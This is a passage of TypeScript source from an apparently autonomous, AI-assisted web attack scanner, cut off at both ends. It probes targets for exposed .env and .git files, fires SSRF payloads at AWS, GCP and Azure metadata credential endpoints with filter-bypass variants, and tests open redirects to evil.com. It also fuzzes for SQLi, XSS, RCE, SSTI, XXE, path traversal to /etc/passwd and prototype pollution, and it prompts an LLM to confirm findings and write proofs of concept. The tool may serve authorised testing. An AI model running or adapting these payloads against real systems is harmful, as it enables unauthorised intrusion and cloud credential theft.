                  headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36' }
                });
                const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

                if (res.status === 200 && !this.isWildcardResponse(hostname, body)) {
                  this.log(jobId, 'info', `Discovered hidden endpoint: ${url} [${res.status}]`);
                  endpoints.push({ url, method: 'GET' });
                } else if (res.status !== 404 && res.status !== 200) {
                  this.log(jobId, 'info', `Potential interesting endpoint: ${url} [${res.status}]`);
                  endpoints.push({ url, method: 'GET' });
                }
              } catch (e) {}
            }
          } catch (e) {}
        }

        endpoints = Array.from(new Set(endpoints.map(e => JSON.stringify(e)))).map(s => JSON.parse(s));
        allFindings.push({ phase: 'Phase 3', type: 'Endpoints Discovered', count: endpoints.length });

        // AI-Driven Security Interest Ranking
        let rankedEndpoints: any[] = [];
        if (ai && endpoints.length > 0) {
          this.log(jobId, 'info', 'Phase 3.5: AI-Driven Security Interest Ranking');
          const rankingPrompt = `Rank the following endpoints by security interest (likelihood of vulnerability).
          Endpoints: ${JSON.stringify(endpoints.slice(0, 100))}
          Tech Stack: ${MemoryManager.getMemory(jobId, hostname).tech.join(', ')}

          Return JSON: { "ranked_endpoints": [ { "url": string, "method": string, "reason": string, "priority": number } ] }`;

          try {
            const rankingText = await ai.generate(rankingPrompt, true);
            if (rankingText) {
              const ranked = JSON.parse(rankingText).ranked_endpoints;
              rankedEndpoints = ranked;
              this.log(jobId, 'info', `AI ranked ${ranked.length} endpoints for prioritized testing.`);
              allFindings.push({ phase: 'Phase 3.5', type: 'AI Prioritization', data: ranked });
            }
          } catch (e) {}
        }

        // --- PHASE 4: EXPLOITATION & PoC (VULNERABILITY VERIFICATION) ---
        this.updateJob(jobId, 'running', 'Phase 4: Exploitation');
        this.log(jobId, 'info', 'Starting Phase 4: Autonomous AI-Driven Vulnerability Verification (Prioritized & Chained)');

        const memory = MemoryManager.getMemory(jobId, hostname);
        const discoveredInfo = {
          users: memory.discoveredUsers,
          identifiers: memory.identifiers,
          findings: memory.findings.map(f => f.type)
        };

        // --- 4a: Specialized Auditors (Auth, CORS, JWT, Session, Business Logic) ---
        this.log(jobId, 'info', 'Phase 4a: Running specialized auditors');
        for (const stack of techStacks) {
          const tech = stack.results?.tech || [];
          await this.auditAuthenticationFlow(jobId, stack.asset, tech, ai);
          await this.auditBusinessLogic(jobId, stack.asset, tech, ai);
        }
        // Run auth/session audits on the primary target even without tech signatures
        if (techStacks.length === 0) {
          await this.auditAuthenticationFlow(jobId, targetUrl, ['auth', 'session'], ai);
        }

        // --- 4b: Sensitive File & Data Disclosure Auditor ---
        this.log(jobId, 'info', 'Phase 4b: Sensitive File & Data Disclosure Audit');

        // Expanded sensitive file detection patterns
        const sensitivePathPatterns = [
          /\.(env|env\.local|env\.production|env\.staging|env\.dev)$/i,
          /\.(git|gitignore|gitconfig|git\/config|git\/HEAD)$/i,
          /\.(config|cfg|ini|yml|yaml|toml|xml|properties)$/i,
          /\.(bak|backup|old|orig|swp|sav|tmp|temp)$/i,
          /\.(sql|dump|db|sqlite|sqlite3|mdb)$/i,
          /\.(log|error_log|access_log|debug\.log)$/i,
          /\.(pem|key|crt|cert|p12|pfx|jks)$/i,
          /\.(htpasswd|htaccess|passwd|shadow)$/i,
        ];
        const sensitiveKeywords = [
          'phpinfo', '.env', 'metrics', 'debug', 'actuator', 'health',
          'swagger', 'api-docs', 'openapi', '.well-known', 'server-status',
          'server-info', 'wp-config', 'config.php', 'database.yml',
          'credentials', 'secret', 'backup', '.DS_Store', 'Thumbs.db',
          'crossdomain.xml', 'clientaccesspolicy.xml', 'elmah.axd',
          'trace.axd', 'web.config', 'application.properties',
        ];

        const sensitiveFiles = endpoints.filter(e => 
          sensitivePathPatterns.some(p => p.test(e.url)) ||
          sensitiveKeywords.some(kw => e.url.toLowerCase().includes(kw))
        );

        // Also probe known sensitive paths directly on discovered assets
        const directProbes = [
          '/.env', '/.git/config', '/.git/HEAD', '/phpinfo.php',
          '/server-status', '/server-info', '/.htpasswd', '/wp-config.php',
          '/actuator/env', '/actuator/health', '/actuator/beans',
          '/swagger-ui.html', '/swagger.json', '/api-docs',
          '/debug', '/metrics', '/trace', '/.DS_Store',
          '/backup.sql', '/database.sql', '/dump.sql',
          '/crossdomain.xml', '/robots.txt', '/sitemap.xml',
          '/api/v1/debug', '/api/config', '/admin/config',
          '/info', '/health', '/status', '/.well-known/openid-configuration',
        ];

        // Build full list of sensitive endpoints to check
        const probeUrls = new Set(sensitiveFiles.map(sf => sf.url));
        for (const asset of discoveredAssets.slice(0, 5)) {
          for (const probe of directProbes) {
            try { probeUrls.add(new URL(probe, asset).href); } catch {}
          }
        }

        const sensitiveContentMarkers = [
          'DB_', 'AWS_', 'SECRET', 'PASSWORD', 'PRIVATE_KEY', 'API_KEY', 'ACCESS_KEY',
          'PHP Version', 'System Info', 'metrics_', 'debug_mode',
          'mysql_connect', 'pg_connect', 'redis://', 'mongodb://',
          'BEGIN RSA', 'BEGIN PRIVATE', 'BEGIN CERTIFICATE',
          'jdbc:', 'amqp://', 'smtp://',
          'DJANGO_SECRET', 'FLASK_SECRET', 'JWT_SECRET', 'SESSION_SECRET',
          'STRIPE_SECRET', 'TWILIO_AUTH', 'SENDGRID_API',
          'Authorization:', 'Bearer ', 'Basic ',
        ];

        let sensitiveFileCount = 0;
        for (const sfUrl of probeUrls) {
          if (sensitiveFileCount >= 20) break; // Cap to avoid excessive requests
          try {
            const sfHostname = new URL(sfUrl).hostname;
            const res = await axios.get(sfUrl, { timeout: 5000, validateStatus: () => true });
            if (res.status === 404 || res.status === 403) continue;
            const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
            
            if (this.isWildcardResponse(sfHostname, bodyStr)) continue;

            const matchedMarkers = sensitiveContentMarkers.filter(m => bodyStr.includes(m));
            const hasSensitiveContent = matchedMarkers.length > 0;

            // Git config file — verify without AI
            if (sfUrl.includes('.git/') && res.status === 200 && bodyStr.includes('[core]')) {
              this.log(jobId, 'vuln', `CONFIRMED Git Repository Exposure: ${sfUrl}`);
              MemoryManager.addFinding(jobId, hostname, { type: 'Git Exposure', endpoint: sfUrl, gap: 'Git repository accessible — source code leak', chain_potential: 'Extract credentials, API keys, and source code' });
              sensitiveFileCount++;
              continue;
            }

            // Actuator endpoints — verify without AI
            if (sfUrl.includes('actuator') && res.status === 200) {
              this.log(jobId, 'vuln', `CONFIRMED Spring Actuator Exposure: ${sfUrl}`, { preview: bodyStr.substring(0, 300) });
              MemoryManager.addFinding(jobId, hostname, { type: 'Actuator Exposure', endpoint: sfUrl, gap: 'Spring Boot Actuator endpoint exposed', chain_potential: 'Environment variables, beans, and health data leaked' });
              sensitiveFileCount++;
              continue;
            }

            // Swagger/OpenAPI — verify without AI
            if ((sfUrl.includes('swagger') || sfUrl.includes('api-docs') || sfUrl.includes('openapi')) && res.status === 200 && (bodyStr.includes('swagger') || bodyStr.includes('openapi'))) {
              this.log(jobId, 'vuln', `API Documentation Exposed: ${sfUrl}`, { preview: bodyStr.substring(0, 300) });
              MemoryManager.addFinding(jobId, hostname, { type: 'API Docs Exposure', endpoint: sfUrl, gap: 'Swagger/OpenAPI docs publicly accessible', chain_potential: 'Map all API endpoints for targeted exploitation' });
              sensitiveFileCount++;
              continue;
            }

            if (res.status === 200 && hasSensitiveContent && ai) {
              const analysisPrompt = `As an autonomous security agent (argila), verify if this is a SENSITIVE FILE DISCLOSURE.
              URL: ${sfUrl}
              Status: ${res.status}
              Matched sensitive markers: ${matchedMarkers.join(', ')}
              Body Snippet: ${bodyStr.substring(0, 3000)}
              
              Determine if this file contains REAL sensitive information (credentials, internal paths, system config) or if it's a false positive.
              Classify severity: CRITICAL (credentials, keys), HIGH (internal config, debug), MEDIUM (info leak), LOW (minor disclosure).
              Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

              const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
              if (analysis.isVulnerable && analysis.confidence > 0.7) {
                this.log(jobId, 'vuln', `CONFIRMED Sensitive File Disclosure: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential, url: sfUrl });
                MemoryManager.addFinding(jobId, hostname, { type: 'Sensitive File Disclosure', endpoint: sfUrl, gap: analysis.gap_identified, chain_potential: analysis.chain_potential });
                sensitiveFileCount++;
              }
            }
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4b complete: ${sensitiveFileCount} sensitive file(s) confirmed across ${probeUrls.size} probes`);

        // --- 4c: SSRF & Open Redirect Auditor ---
        this.log(jobId, 'info', 'Phase 4c: SSRF & Open Redirect Audit');

        // Expanded SSRF endpoint detection — GET and POST parameters
        const ssrfParamPatterns = ['url', 'dest', 'redirect', 'uri', 'path', 'next', 'target', 'rurl', 'return', 'returnTo', 'callback', 'go', 'link', 'src', 'source', 'file', 'document', 'fetch', 'proxy', 'host', 'domain', 'site', 'page', 'feed', 'img', 'image'];
        const ssrfEndpoints = endpoints.filter(e => {
          const lower = e.url.toLowerCase();
          return ssrfParamPatterns.some(p => lower.includes(`${p}=`) || lower.includes(`${p}%3d`));
        });

        // Cloud metadata payloads — expanded with bypass variants
        const cloudPayloads = [
          // AWS
          { url: 'http://169.254.169.254/latest/meta-data/', name: 'AWS IMDSv1', markers: ['ami-id', 'instance-id', 'iam', 'security-credentials'] },
          { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', name: 'AWS IAM Creds', markers: ['AccessKeyId', 'SecretAccessKey', 'Token'] },
          { url: 'http://169.254.169.254/latest/user-data', name: 'AWS User Data', markers: ['#!/', 'cloud-init', 'user-data'] },
          // AWS bypass variants
          { url: 'http://[::ffff:169.254.169.254]/latest/meta-data/', name: 'AWS IPv6 Bypass', markers: ['ami-id', 'instance-id'] },
          { url: 'http://169.254.169.254.nip.io/latest/meta-data/', name: 'AWS DNS Rebind', markers: ['ami-id', 'instance-id'] },
          { url: 'http://0xA9FEA9FE/latest/meta-data/', name: 'AWS Hex IP', markers: ['ami-id', 'instance-id'] },
          // GCP
          { url: 'http://metadata.google.internal/computeMetadata/v1/', name: 'GCP Metadata', markers: ['computeMetadata', 'project-id'] },
          { url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', name: 'GCP Token', markers: ['access_token'] },
          // Azure
          { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', name: 'Azure Metadata', markers: ['compute', 'vmId'] },
          { url: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', name: 'Azure Token', markers: ['access_token'] },
          // DigitalOcean
          { url: 'http://169.254.169.254/metadata/v1/', name: 'DO Metadata', markers: ['droplet_id', 'hostname'] },
          // Internal services
          { url: 'http://127.0.0.1:6379/', name: 'Redis', markers: ['REDIS', 'redis_version'] },
          { url: 'http://127.0.0.1:9200/', name: 'Elasticsearch', markers: ['cluster_name', 'version'] },
          { url: 'http://127.0.0.1:8500/v1/agent/self', name: 'Consul', markers: ['Config', 'Member'] },
        ];

        let ssrfCount = 0;
        for (const se of ssrfEndpoints.slice(0, 30)) {
          if (ssrfCount >= 5) break; // Cap confirmed SSRFs
          for (const cp of cloudPayloads) {
            try {
              // Try replacing each matching parameter
              const paramRegex = new RegExp(`(${ssrfParamPatterns.join('|')})=([^&]+)`, 'i');
              const testUrl = se.url.replace(paramRegex, `$1=${encodeURIComponent(cp.url)}`);
              if (testUrl === se.url) continue; // No param was replaced
              
              const headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0' };
              if (cp.name.includes('GCP')) headers['Metadata-Flavor'] = 'Google';
              if (cp.name.includes('Azure')) headers['Metadata'] = 'true';
              
              const res = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true, headers, maxRedirects: 0 });
              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

              if (res.status === 200 && cp.markers.some(m => bodyStr.includes(m))) {
                this.log(jobId, 'vuln', `CONFIRMED SSRF → ${cp.name}: ${se.url}`, { payload: cp.url, evidence: bodyStr.substring(0, 500) });
                MemoryManager.addFinding(jobId, hostname, { type: 'SSRF', endpoint: se.url, gap: `SSRF to ${cp.name}`, chain_potential: `Full ${cp.name.split(' ')[0]} takeover via metadata tokens` });
                ssrfCount++;
                break; // Move to next endpoint once one payload hits
              }
            } catch {}
          }
        }

        // Open Redirect detection via parameter manipulation
        const redirectEndpoints = endpoints.filter(e => {
          const lower = e.url.toLowerCase();
          return ['redirect', 'next', 'return', 'returnto', 'callback', 'go', 'url', 'rurl', 'dest'].some(p => lower.includes(`${p}=`));
        });

        for (const re of redirectEndpoints.slice(0, 20)) {
          try {
            const redirectPayloads = [
              'https://evil.com',
              '//evil.com',
              '/\\evil.com',
              'https:evil.com',
              '////evil.com',
            ];
            for (const payload of redirectPayloads) {
              const paramRegex = new RegExp(`(redirect|next|return|returnto|callback|go|url|rurl|dest)=([^&]+)`, 'i');
              const testUrl = re.url.replace(paramRegex, `$1=${encodeURIComponent(payload)}`);
              if (testUrl === re.url) continue;
              
              const res = await axios.get(testUrl, { timeout: 5000, maxRedirects: 0, validateStatus: () => true });
              const location = (res.headers['location'] || '').toLowerCase();
              if ((res.status === 301 || res.status === 302 || res.status === 303 || res.status === 307 || res.status === 308) && location.includes('evil.com')) {
                this.log(jobId, 'vuln', `CONFIRMED OPEN REDIRECT: ${re.url}`, { payload, location: res.headers['location'] });
                MemoryManager.addFinding(jobId, hostname, { type: 'Open Redirect', endpoint: re.url, gap: 'Unvalidated redirect allows arbitrary domain', chain_potential: 'Phishing, OAuth token theft via redirect' });
                break;
              }
            }
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4c complete: ${ssrfCount} SSRF(s) confirmed across ${ssrfEndpoints.length} candidate endpoints`);

        // 4. Generic Vulnerability Fuzzing (SQLi, XSS, etc.)
        const vulnerabilities: any[] = [];
        
        // --- STACK GAP ANALYSIS (Adversary Simulation) ---
        this.log(jobId, 'info', 'Phase 4: Stack Gap Analysis (WAF/Proxy Smuggling)');
        for (const asset of discoveredAssets.slice(0, 5)) {
          try {
            const gaps = await StackGapAnalyzer.analyze(asset);
            if (gaps.length > 0) {
              this.log(jobId, 'vuln', `STACK GAP IDENTIFIED on ${asset}`, { gaps });
              allFindings.push({ phase: 'Phase 4', type: 'Stack Gap Findings', asset, data: gaps });
            }
          } catch (e) {
            this.log(jobId, 'warn', `Stack gap analysis failed for ${asset}: ${(e as Error).message}`);
          }
        }

        // Priority-based testing: combine AI-ranked with keyword-based high-value endpoints
        const keywordEndpoints = endpoints.filter(e => {
          const lower = e.url.toLowerCase();
          return lower.includes('api') || lower.includes('admin') || lower.includes('auth') || lower.includes('?') || lower.includes('login') || lower.includes('user') || lower.includes('account') || lower.includes('profile');
        });

        // Build priority map to preserve highest priority per URL
        const priorityMap = new Map<string, { url: string; method: string; priority: number }>();
        for (const re of rankedEndpoints) {
          const entry = { url: re.url, method: re.method || 'GET', priority: re.priority || 1 };
          const existing = priorityMap.get(re.url);
          if (!existing || entry.priority < existing.priority) priorityMap.set(re.url, entry);
        }
        for (const ke of keywordEndpoints) {
          if (!priorityMap.has(ke.url)) priorityMap.set(ke.url, { ...ke, priority: 2 });
        }

        const prioritizedEndpoints = Array.from(priorityMap.values())
          .sort((a, b) => a.priority - b.priority)
          .slice(0, 100);

        this.log(jobId, 'info', `Executing autonomous exploit chain on ${prioritizedEndpoints.length} prioritized endpoints`, {
          active_intelligence: {
            users: discoveredInfo.users.length,
            identifiers: Object.keys(discoveredInfo.identifiers).length,
            prioritized_targets: prioritizedEndpoints.length
          }
        });

        // --- IDOR Detection (enhanced with UUID and string ID patterns) ---
        for (const ep of prioritizedEndpoints) {
          // Numeric ID pattern
          const numIdMatch = ep.url.match(/\/(\d+)(?:\/|$|\?)/);
          // UUID pattern
          const uuidMatch = ep.url.match(/\/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:\/|$|\?)/i);

          if (numIdMatch || uuidMatch) {
            const originalId = numIdMatch ? numIdMatch[1] : uuidMatch![1];
            const testIds = numIdMatch
              ? [String(parseInt(originalId) + 1), String(parseInt(originalId) - 1), '1', '0', '999999']
              : ['00000000-0000-0000-0000-000000000000', '11111111-1111-1111-1111-111111111111'];

            // Fetch baseline once
            const baselineRes = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true }).catch(() => null);
            if (!baselineRes || baselineRes.status === 404) continue;

            for (const testId of testIds) {
              try {
                const testUrl = ep.url.replace(`/${originalId}`, `/${testId}`);
                const res = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true });
                
                const baseBody = typeof baselineRes.data === 'string' ? baselineRes.data : JSON.stringify(baselineRes.data);
                const testBody = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

                if (res.status === 200 && res.status === baselineRes.status && testBody !== baseBody && testBody.length > 50) {
                  if (ai) {
                    const analysisPrompt = `Analyze these two responses for IDOR (Insecure Direct Object Reference).
                    Original URL: ${ep.url} | Test URL: ${testUrl}
                    Response 1 Body: ${baseBody.substring(0, 1000)}
                    Response 2 Body: ${testBody.substring(0, 1000)}
                    
                    Determine if changing the ID allowed access to another user's/object's data. Check for PII, different user context, or unauthorized data access.
                    Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

                    const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
                    if (analysis.isVulnerable && analysis.confidence > 0.8) {
                      this.log(jobId, 'vuln', `CONFIRMED IDOR: ${analysis.gap_identified}`, { explanation: analysis.explanation, originalUrl: ep.url, testUrl });
                      vulnerabilities.push({ endpoint: ep.url, type: 'IDOR', gap: analysis.gap_identified, evidence: analysis.explanation });
                      MemoryManager.addFinding(jobId, hostname, { type: 'IDOR', endpoint: ep.url, gap: analysis.gap_identified, chain_potential: analysis.chain_potential });
                      break; // One confirmed IDOR per endpoint is enough
                    }
                  }
                }
              } catch {}
            }
          }
        }

        // --- Payload Fuzzing (SQLi, XSS, Path Traversal, SSRF, RCE, SSTI, NoSQLi) ---
        const vulnTypes = ['SQLi', 'XSS', 'Path Traversal', 'SSRF', 'RCE', 'SSTI', 'NoSQLi'];

        // Cache baselines per URL to avoid redundant requests
        const baselineCache = new Map<string, { status: number; body: string } | null>();
        async function getBaseline(url: string) {
          if (baselineCache.has(url)) return baselineCache.get(url)!;
          try {
            const res = await axios.get(url, { timeout: 5000, validateStatus: () => true });
            const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
            const entry = { status: res.status, body };
            baselineCache.set(url, entry);
            return entry;
          } catch {
            baselineCache.set(url, null);
            return null;
          }
        }

        for (const ep of prioritizedEndpoints) {
          const baseline = await getBaseline(ep.url);
          
          for (const type of vulnTypes) {
            try {
              const aiContext = `Endpoint: ${ep.url}, Method: ${ep.method}, Tech: ${memory.tech.join(', ')}, Discovered Intel: ${JSON.stringify(discoveredInfo)}`;
              const customPayload = await PayloadOven.generateCustomPayload(ai, type, aiContext);
              
              // Smart parameter replacement — replace each param value individually
              let testUrl = ep.url;
              if (ep.url.includes('=')) {
                testUrl = ep.url.replace(/=([^&]+)/g, `=${encodeURIComponent(customPayload)}`);
              } else {
                testUrl = ep.url.includes('?') ? `${ep.url}&test=${encodeURIComponent(customPayload)}` : `${ep.url}?test=${encodeURIComponent(customPayload)}`;
              }
              
              const startTime = Date.now();
              const res = await axios.get(testUrl, { timeout: 8000, validateStatus: () => true });
              const latency = Date.now() - startTime;
              
              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
              const isStatusDiff = baseline && res.status !== baseline.status;
              const isLatencySpike = type === 'SQLi' && latency > 3000;
              
              // Enhanced error markers per vuln type
              const errorMarkers: Record<string, string[]> = {
                'SQLi': ['sql syntax', 'mysql', 'postgresql', 'sqlite', 'ora-', 'mssql', 'unclosed quotation', 'quoted string', 'syntax error at'],
                'XSS': [customPayload, '<script>', 'onerror=', 'onload='],
                'Path Traversal': ['root:', '/bin/', 'win.ini', '[extensions]', 'etc/passwd'],
                'RCE': ['uid=', 'gid=', 'root:', 'www-data'],
                'SSTI': ['49', '7777777', '__class__', 'config'],
                'SSRF': ['ami-id', 'instance-id', 'computeMetadata'],
                'NoSQLi': ['$gt', '$ne', 'CastError', 'ObjectId'],
              };
              
              const typeMarkers = errorMarkers[type] || [];
              const bodyLower = bodyStr.toLowerCase();
              const hasTypeMarkers = typeMarkers.some(m => bodyLower.includes(m.toLowerCase()));
              const hasGenericError = bodyLower.includes('error') || bodyLower.includes('exception') || bodyLower.includes('stack trace');

              // Verification trigger: need at least one indicator
              if (ai && (isStatusDiff || isLatencySpike || hasTypeMarkers || (hasGenericError && isStatusDiff))) {
                const analysisPrompt = `As an autonomous security agent (argila), analyze this HTTP interaction on ${hostname} to find the exact security gap.
                Target URL: ${testUrl}
                Payload: ${customPayload}
                Vulnerability Type: ${type}
                Response Status: ${res.status} (baseline: ${baseline?.status || 'unknown'})
                Response Latency: ${latency}ms
                Response Body (truncated): ${bodyStr.substring(0, 2000)}
                Matched Indicators: ${hasTypeMarkers ? 'type-specific markers found' : ''} ${isLatencySpike ? 'timing anomaly' : ''} ${isStatusDiff ? 'status code change' : ''}
                
                [CONTEXT]: Tech: ${memory.tech.join(', ')} | Users: ${memory.discoveredUsers.join(', ')} | Findings: ${JSON.stringify(memory.findings)}
                
                Determine if this is a REAL ${type} vulnerability. Reject false positives (generic error pages, WAF blocks, rate limits).
                Can this be chained with previous findings for escalation?
                Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

                const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
                if (analysis.isVulnerable && analysis.confidence > 0.8) {
                  this.log(jobId, 'vuln', `CONFIRMED ${type}: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential, payload: customPayload });
                  const finding = { 
                    endpoint: ep.url, type, payload: customPayload, 
                    gap: analysis.gap_identified, evidence: analysis.explanation, chain: analysis.chain_potential
                  };
                  vulnerabilities.push(finding);
                  MemoryManager.addFinding(jobId, hostname, finding);
                }
              }
            } catch {}
          }
        }

        this.log(jobId, 'info', `Phase 4 fuzzing complete: ${vulnerabilities.length} vulnerability(ies) confirmed across ${prioritizedEndpoints.length} endpoints`);

        // --- PoC Generation (hardened with safe JSON parse) ---
        if (ai && vulnerabilities.length > 0) {
          const pocPrompt = `Generate a detailed Proof of Concept (PoC) for these confirmed vulnerabilities: ${JSON.stringify(vulnerabilities.slice(0, 10))}. 
          Target: ${targetUrl}. 
          Include: 1. Description, 2. Steps to Reproduce (curl/browser), 3. Impact (CIA triad), 4. Remediation.
          Format: JSON { "pocs": [ { "title": string, "steps": string[], "impact": string, "remediation": string, "severity": string } ] }`;
          
          const pocData = safeJsonParse<{ pocs: any[] }>(await ai.generate(pocPrompt, true), { pocs: [] });
          if (pocData.pocs.length > 0) {
            allFindings.push({ phase: 'Phase 4', type: 'AI PoC Reports', data: pocData.pocs });
          }
        }

        // --- PHASE 4d: AUTONOMOUS 0DAY DISCOVERY ---
        this.log(jobId, 'info', 'Phase 4d: Autonomous 0day Discovery');

        const zerodayTargets = prioritizedEndpoints.slice(0, 30);

        // 4d-1: Behavioral Anomaly Fuzzing — edge-case inputs that trigger parser bugs
        this.log(jobId, 'info', 'Phase 4d-1: Behavioral Anomaly Fuzzing');
        const anomalyProbes: { name: string; value: string; markers: string[] }[] = [
          { name: 'Overlong UTF-8', value: '%C0%AE%C0%AE/%C0%AE%C0%AE/%C0%AE%C0%AE/etc/passwd', markers: ['root:', '/bin/'] },
          { name: 'Null byte injection', value: 'test%00.html', markers: ['error', 'exception', 'stack'] },
          { name: 'Format string', value: '%s%s%s%s%s%s%s%s%s%s%n%n%n%n', markers: ['segfault', 'SIGSEGV', 'core dump', 'format'] },
          { name: 'Integer overflow', value: '99999999999999999999999999999999', markers: ['overflow', 'range', 'conversion', 'NaN', 'Infinity'] },
          { name: 'Negative index', value: '-1', markers: ['index', 'range', 'bound', 'underflow'] },
          { name: 'Prototype pollution', value: '__proto__[isAdmin]=true', markers: ['prototype', 'isAdmin', '__proto__'] },
          { name: 'Proto pollution JSON', value: '{"__proto__":{"isAdmin":true}}', markers: ['prototype', 'isAdmin'] },
          { name: 'Java deserialization', value: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA', markers: ['java.io', 'ClassNotFoundException', 'ObjectInputStream', 'deserialization'] },
          { name: 'PHP object injection', value: 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}', markers: ['unserialize', 'Object of class', '__wakeup'] },
          { name: 'CRLF injection', value: 'test%0d%0aInjected-Header:%20true', markers: ['Injected-Header', 'injected-header'] },
          { name: 'Unicode normalization', value: '\u{FF0E}\u{FF0E}/\u{FF0E}\u{FF0E}/etc/passwd', markers: ['root:', '/bin/'] },
          { name: 'Template expression', value: '${7*7}{{7*7}}<%= 7*7 %>${{7*7}}#{7*7}', markers: ['49'] },
          { name: 'XML entity', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', markers: ['ENTITY', 'hostname', 'xxe'] },
          { name: 'GraphQL introspection', value: '{"query":"{__schema{types{name}}}"}', markers: ['__schema', '__type', 'queryType'] },
          { name: 'Polyglot XSS/SQLi', value: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", markers: ['alert', 'oNcliCk', 'oNloAd'] },
        ];

        // Fetch baseline for anomaly comparison
        const anomalyBaselines = new Map<string, { status: number; length: number; latency: number }>();
        for (const ep of zerodayTargets.slice(0, 15)) {
          try {
            const start = Date.now();
            const res = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true });
            anomalyBaselines.set(ep.url, {
              status: res.status,
              length: (typeof res.data === 'string' ? res.data : JSON.stringify(res.data)).length,
              latency: Date.now() - start,
            });
          } catch {}
        }

        let anomalyCount = 0;
        for (const ep of zerodayTargets.slice(0, 15)) {
          if (anomalyCount >= 10) break;
          const baseline = anomalyBaselines.get(ep.url);
          if (!baseline) continue;

          for (const probe of anomalyProbes) {
            try {
              const separator = ep.url.includes('?') ? '&' : '?';
              const testUrl = `${ep.url}${separator}zd=${encodeURIComponent(probe.value)}`;

              const start = Date.now();
              const res = await axios.get(testUrl, { timeout: 8000, validateStatus: () => true });
              const latency = Date.now() - start;
              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
              const bodyLen = bodyStr.length;

              const statusShift = res.status !== baseline.status;
              const sizeAnomaly = Math.abs(bodyLen - baseline.length) > baseline.length * 0.5 && bodyLen > 200;
              const latencySpike = latency > baseline.latency * 3 && latency > 2000;
              const markerHit = probe.markers.some(m => bodyStr.toLowerCase().includes(m.toLowerCase()));
              const errorLeak = /exception|stacktrace|traceback|fatal|panic|segfault|core dump|syntax error|unexpected token/i.test(bodyStr);

              if ((statusShift && res.status >= 500) || markerHit || errorLeak || (sizeAnomaly && latencySpike)) {
                const evidence: string[] = [];
                if (statusShift) evidence.push(`Status shift: ${baseline.status} → ${res.status}`);
                if (sizeAnomaly) evidence.push(`Size anomaly: ${baseline.length} → ${bodyLen}`);
                if (latencySpike) evidence.push(`Latency spike: ${baseline.latency}ms → ${latency}ms`);
                if (markerHit) evidence.push(`Marker hit: ${probe.markers.filter(m => bodyStr.toLowerCase().includes(m.toLowerCase())).join(', ')}`);
                if (errorLeak) evidence.push(`Error leak detected in response`);

                if (ai) {
                  const analysisPrompt = `As an elite security researcher, analyze this behavioral anomaly for potential 0day vulnerability.

Endpoint: ${ep.url}
Probe Type: ${probe.name}
Probe Value: ${probe.value}
Evidence: ${evidence.join(' | ')}
Response Status: ${res.status}
Response Body Snippet: ${bodyStr.substring(0, 2000)}
Baseline: Status ${baseline.status}, Size ${baseline.length}, Latency ${baseline.latency}ms
Tech Stack: ${discoveredInfo.identifiers ? JSON.stringify(discoveredInfo.identifiers) : 'unknown'}

Determine if this anomaly indicates a real exploitable vulnerability (potential 0day).
Consider: parser differential, memory corruption indicators, deserialization, injection bypass, access control failure.
Rate severity: CRITICAL (RCE/data breach), HIGH (auth bypass/info leak), MEDIUM (DoS/limited impact).
Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null, "severity": string, "cve_similar": string | null }`;

                  const analysis = safeJsonParse<AiVulnResult & { severity?: string; cve_similar?: string | null }>(
                    await ai.generate(analysisPrompt, true), { ...NULL_VULN, severity: 'UNKNOWN', cve_similar: null }
                  );

                  if (analysis.isVulnerable && analysis.confidence > 0.7) {
                    this.log(jobId, 'vuln', `0DAY CANDIDATE [${probe.name}]: ${analysis.gap_identified}`, {
                      endpoint: ep.url, probe: probe.name, evidence, severity: analysis.severity,
                      explanation: analysis.explanation, chain: analysis.chain_potential, cve_similar: analysis.cve_similar
                    });
                    MemoryManager.addFinding(jobId, hostname, {
                      type: '0day Candidate', endpoint: ep.url, probe: probe.name,
                      gap: analysis.gap_identified, chain_potential: analysis.chain_potential,
                      evidence, severity: analysis.severity
                    });
                    anomalyCount++;
                  }
                } else {
                  this.log(jobId, 'vuln', `BEHAVIORAL ANOMALY [${probe.name}]: ${ep.url}`, { evidence });
                  MemoryManager.addFinding(jobId, hostname, {
